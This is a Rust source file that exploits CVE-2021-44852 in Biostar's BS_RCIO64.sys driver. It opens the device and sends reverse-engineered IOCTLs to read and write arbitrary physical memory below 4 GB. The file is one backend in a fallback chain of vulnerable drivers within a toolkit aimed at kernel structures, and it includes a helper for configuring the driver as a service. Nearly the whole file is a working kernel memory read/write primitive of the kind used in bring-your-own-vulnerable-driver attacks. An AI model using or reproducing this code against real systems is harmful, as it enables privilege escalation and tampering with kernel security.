//! BS_RCIO64.sys Backend — Physical Memory R/W via Biostar I/O Driver
//!
//! CVE-2021-44852: Insufficient access control on \Device\BS_RCIO allows
//! kernel-level physical memory read/write via MmMapIoSpace.
//!
//! LIMITATION: Physical addresses are 32-bit only (max 4 GB addressable).
//! This driver should be lowest priority in the fallback chain.
//!
//! SAFETY: This module performs NO driver loading. Static analysis only
//! informed this implementation. The caller must ensure the driver is
//! already loaded before invoking these functions.

use std::io::{self, Error, ErrorKind};
use std::mem::size_of;
use std::ptr::null_mut;

// Windows FFI types
#[cfg(windows)]
use std::os::windows::io::RawHandle;

// IOCTL codes (from static RE)
const IOCTL_PHYS_READ: u32 = 0x226040;
const IOCTL_PHYS_WRITE: u32 = 0x226044;

// Device path
const DEVICE_PATH: &str = r"\\.\BS_RCIO";

// Maximum addressable physical address (32-bit limitation)
const MAX_PHYS_ADDR: u64 = 0xFFFF_FFFF;

/// Handle wrapper for the BS_RCIO64 device
#[cfg(windows)]
pub struct BsRcioDevice {
    handle: RawHandle,
}

#[cfg(windows)]
extern "system" {
    fn CreateFileW(
        lpFileName: *const u16,
        dwDesiredAccess: u32,
        dwShareMode: u32,
        lpSecurityAttributes: *mut u8,
        dwCreationDisposition: u32,
        dwFlagsAndAttributes: u32,
        hTemplateFile: RawHandle,
    ) -> RawHandle;

    fn DeviceIoControl(
        hDevice: RawHandle,
        dwIoControlCode: u32,
        lpInBuffer: *const u8,
        nInBufferSize: u32,
        lpOutBuffer: *mut u8,
        nOutBufferSize: u32,
        lpBytesReturned: *mut u32,
        lpOverlapped: *mut u8,
    ) -> i32;

    fn CloseHandle(hObject: RawHandle) -> i32;
    fn GetLastError() -> u32;
}

const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE_VALUE: isize = -1;

#[cfg(windows)]
impl BsRcioDevice {
    /// Open a handle to the BS_RCIO64 device.
    /// Requires the driver to be already loaded as a service.
    /// Typically requires Administrator privileges (default DACL).
    pub fn open() -> io::Result<Self> {
        let wide_path: Vec<u16> = DEVICE_PATH.encode_utf16().chain(std::iter::once(0)).collect();

        let handle = unsafe {
            CreateFileW(
                wide_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0, // no sharing
                null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                null_mut() as RawHandle,
            )
        };

        if handle as isize == INVALID_HANDLE_VALUE {
            let err = unsafe { GetLastError() };
            return Err(Error::new(
                ErrorKind::PermissionDenied,
                format!(
                    "Failed to open {}. Error: {}. Is BS_RCIO64.sys loaded?",
                    DEVICE_PATH, err
                ),
            ));
        }

        Ok(Self { handle })
    }

    /// Check if the device is accessible (probe without full open).
    pub fn probe() -> bool {
        match Self::open() {
            Ok(dev) => {
                drop(dev);
                true
            }
            Err(_) => false,
        }
    }

    /// Read physical memory at the specified address.
    ///
    /// # Arguments
    /// * `phys_addr` - Physical address to read from (must be <= 0xFFFFFFFF)
    /// * `size` - Number of bytes to read
    ///
    /// # Returns
    /// * `Ok(Vec<u8>)` - The data read from physical memory
    /// * `Err` - If address exceeds 32-bit or IOCTL fails
    ///
    /// # IOCTL Protocol (0x226040)
    /// Input:  [DWORD PhysicalAddress]  (4 bytes, written to SystemBuffer)
    /// Output: [BYTE[size]]             (SystemBuffer overwritten with read data)
    ///
    /// METHOD_BUFFERED: The I/O manager allocates a system buffer of
    /// max(InputBufferLength, OutputBufferLength). Input is copied in,
    /// output is copied out after completion.
    pub fn read_phys(&self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>> {
        if phys_addr > MAX_PHYS_ADDR {
            return Err(Error::new(
                ErrorKind::InvalidInput,
                format!(
                    "BS_RCIO64 only supports 32-bit physical addresses. \
                     Requested: {:#x}, max: {:#x}",
                    phys_addr, MAX_PHYS_ADDR
                ),
            ));
        }

        if size == 0 {
            return Ok(Vec::new());
        }

        // Input buffer: 4-byte physical address
        let addr_bytes = (phys_addr as u32).to_le_bytes();

        // Output buffer: will receive the read data
        let mut output = vec![0u8; size];
        let mut bytes_returned: u32 = 0;

        let success = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_READ,
                addr_bytes.as_ptr(),
                4, // InputBufferLength = sizeof(DWORD)
                output.as_mut_ptr(),
                size as u32, // OutputBufferLength = requested read size
                &mut bytes_returned,
                null_mut(),
            )
        };

        if success == 0 {
            let err = unsafe { GetLastError() };
            return Err(Error::new(
                ErrorKind::Other,
                format!("IOCTL_PHYS_READ failed at {:#010x}, size {}. Win32 error: {}", phys_addr, size, err),
            ));
        }

        output.truncate(bytes_returned as usize);
        Ok(output)
    }

    /// Read a single DWORD (4 bytes) from physical memory.
    /// Optimized path in the driver (single mov instruction).
    pub fn read_phys_u32(&self, phys_addr: u64) -> io::Result<u32> {
        let data = self.read_phys(phys_addr, 4)?;
        if data.len() < 4 {
            return Err(Error::new(ErrorKind::UnexpectedEof, "Short read"));
        }
        Ok(u32::from_le_bytes([data[0], data[1], data[2], data[3]]))
    }

    /// Read a single QWORD (8 bytes) from physical memory.
    pub fn read_phys_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let data = self.read_phys(phys_addr, 8)?;
        if data.len() < 8 {
            return Err(Error::new(ErrorKind::UnexpectedEof, "Short read"));
        }
        Ok(u64::from_le_bytes([
            data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7],
        ]))
    }

    /// Write data to physical memory at the specified address.
    ///
    /// # Arguments
    /// * `phys_addr` - Physical address to write to (must be <= 0xFFFFFFFF)
    /// * `data` - Bytes to write
    ///
    /// # IOCTL Protocol (0x226044)
    /// Input: [DWORD PhysicalAddress | BYTE[N] WriteData]
    ///        Total InputBufferLength = 4 + data.len()
    /// Output: None
    ///
    /// The driver extracts PhysAddr from buf[0..4], then writes buf[4..] to
    /// the mapped physical address. Write size = InputBufferLength - 4.
    pub fn write_phys(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        if phys_addr > MAX_PHYS_ADDR {
            return Err(Error::new(
                ErrorKind::InvalidInput,
                format!(
                    "BS_RCIO64 only supports 32-bit physical addresses. \
                     Requested: {:#x}, max: {:#x}",
                    phys_addr, MAX_PHYS_ADDR
                ),
            ));
        }

        if data.is_empty() {
            return Ok(());
        }

        // Build input buffer: [DWORD addr][BYTE[] data]
        let mut input = Vec::with_capacity(4 + data.len());
        input.extend_from_slice(&(phys_addr as u32).to_le_bytes());
        input.extend_from_slice(data);

        let mut bytes_returned: u32 = 0;

        let success = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_WRITE,
                input.as_ptr(),
                input.len() as u32, // InputBufferLength = 4 + data.len()
                null_mut(),
                0, // No output
                &mut bytes_returned,
                null_mut(),
            )
        };

        if success == 0 {
            let err = unsafe { GetLastError() };
            return Err(Error::new(
                ErrorKind::Other,
                format!(
                    "IOCTL_PHYS_WRITE failed at {:#010x}, size {}. Win32 error: {}",
                    phys_addr,
                    data.len(),
                    err
                ),
            ));
        }

        Ok(())
    }

    /// Write a single DWORD to physical memory.
    /// Optimized path in the driver (single mov instruction).
    pub fn write_phys_u32(&self, phys_addr: u64, value: u32) -> io::Result<()> {
        self.write_phys(phys_addr, &value.to_le_bytes())
    }

    /// Write a single QWORD to physical memory.
    pub fn write_phys_u64(&self, phys_addr: u64, value: u64) -> io::Result<()> {
        self.write_phys(phys_addr, &value.to_le_bytes())
    }

    /// Check if a physical address is within the driver's addressable range.
    pub fn is_addressable(phys_addr: u64) -> bool {
        phys_addr <= MAX_PHYS_ADDR
    }

    /// Get the maximum addressable physical address for this driver.
    pub fn max_address() -> u64 {
        MAX_PHYS_ADDR
    }

    /// Get the device path string.
    pub fn device_path() -> &'static str {
        DEVICE_PATH
    }

    /// Get driver identification info for logging/status.
    pub fn driver_info() -> DriverInfo {
        DriverInfo {
            name: "BS_RCIO64",
            vendor: "BIOSTAR Group",
            device_path: DEVICE_PATH,
            cve: "CVE-2021-44852",
            max_phys_addr: MAX_PHYS_ADDR,
            method: "MmMapIoSpace",
            address_bits: 32,
        }
    }
}

#[cfg(windows)]
impl Drop for BsRcioDevice {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.handle);
        }
    }
}

/// Static driver information for status display.
pub struct DriverInfo {
    pub name: &'static str,
    pub vendor: &'static str,
    pub device_path: &'static str,
    pub cve: &'static str,
    pub max_phys_addr: u64,
    pub method: &'static str,
    pub address_bits: u32,
}

/// Trait for physical memory access (shared across driver backends).
/// BS_RCIO64 implements this with a 32-bit address constraint.
pub trait PhysicalMemory {
    fn read(&self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>>;
    fn write(&self, phys_addr: u64, data: &[u8]) -> io::Result<()>;
    fn max_address(&self) -> u64;
    fn name(&self) -> &str;
}

#[cfg(windows)]
impl PhysicalMemory for BsRcioDevice {
    fn read(&self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>> {
        self.read_phys(phys_addr, size)
    }

    fn write(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        self.write_phys(phys_addr, data)
    }

    fn max_address(&self) -> u64 {
        MAX_PHYS_ADDR
    }

    fn name(&self) -> &str {
        "BS_RCIO64"
    }
}

// ─── Integration with toolkit driver chain ───────────────────────────────────

/// Priority in the driver fallback chain.
/// BS_RCIO64 is LOWEST priority due to 32-bit address limitation.
///
/// Chain order: SIVX64 (prio 1) → ASMMAP64 (prio 2) → BS_RCIO64 (prio 3)
pub const DRIVER_CHAIN_PRIORITY: u8 = 3;

/// Check if this driver can reach the specified physical address.
/// Returns false for addresses above 4GB.
pub fn can_reach_address(phys_addr: u64) -> bool {
    phys_addr <= MAX_PHYS_ADDR
}

/// Determine if this driver is suitable for the target system.
/// Returns a warning if total physical memory exceeds 4GB.
pub fn suitability_check(total_ram_bytes: u64) -> SuitabilityResult {
    if total_ram_bytes <= MAX_PHYS_ADDR as u64 + 1 {
        SuitabilityResult::Suitable
    } else {
        SuitabilityResult::Limited {
            reason: format!(
                "System has {:.1} GB RAM but BS_RCIO64 can only address first 4 GB. \
                 Kernel structures above 4 GB boundary are unreachable.",
                total_ram_bytes as f64 / (1024.0 * 1024.0 * 1024.0)
            ),
            addressable_fraction: (MAX_PHYS_ADDR as f64 + 1.0) / total_ram_bytes as f64,
        }
    }
}

pub enum SuitabilityResult {
    Suitable,
    Limited {
        reason: String,
        addressable_fraction: f64,
    },
}

// ─── Service installation helper ─────────────────────────────────────────────

/// Service configuration for loading BS_RCIO64.sys via Windows SCM.
pub struct ServiceConfig {
    pub service_name: &'static str,
    pub display_name: &'static str,
    pub driver_path: String, // absolute path to .sys file
}

impl ServiceConfig {
    pub fn new(driver_path: impl Into<String>) -> Self {
        Self {
            service_name: "BS_RCIO64",
            display_name: "BIOSTAR I/O Driver",
            driver_path: driver_path.into(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_address_validation() {
        assert!(can_reach_address(0x0));
        assert!(can_reach_address(0x1000));
        assert!(can_reach_address(0xFFFF_FFFF));
        assert!(!can_reach_address(0x1_0000_0000));
        assert!(!can_reach_address(0x2_0000_0000));
    }

    #[test]
    fn test_suitability_4gb() {
        let result = suitability_check(4 * 1024 * 1024 * 1024); // 4GB
        assert!(matches!(result, SuitabilityResult::Suitable));
    }

    #[test]
    fn test_suitability_16gb() {
        let result = suitability_check(16 * 1024 * 1024 * 1024); // 16GB
        match result {
            SuitabilityResult::Limited { addressable_fraction, .. } => {
                assert!((addressable_fraction - 0.25).abs() < 0.01);
            }
            _ => panic!("Expected Limited for 16GB system"),
        }
    }

    #[test]
    fn test_ioctl_codes() {
        // Verify IOCTL decomposition
        // CTL_CODE(DeviceType, Function, Method, Access)
        // = (DeviceType << 16) | (Access << 14) | (Function << 2) | Method

        let read_code = (0x22 << 16) | (1 << 14) | (0x810 << 2) | 0;
        assert_eq!(read_code, IOCTL_PHYS_READ);

        let write_code = (0x22 << 16) | (1 << 14) | (0x811 << 2) | 0;
        assert_eq!(write_code, IOCTL_PHYS_WRITE);
    }

    #[test]
    fn test_driver_info() {
        let info = BsRcioDevice::driver_info();
        assert_eq!(info.name, "BS_RCIO64");
        assert_eq!(info.address_bits, 32);
        assert_eq!(info.max_phys_addr, 0xFFFF_FFFF);
    }
}
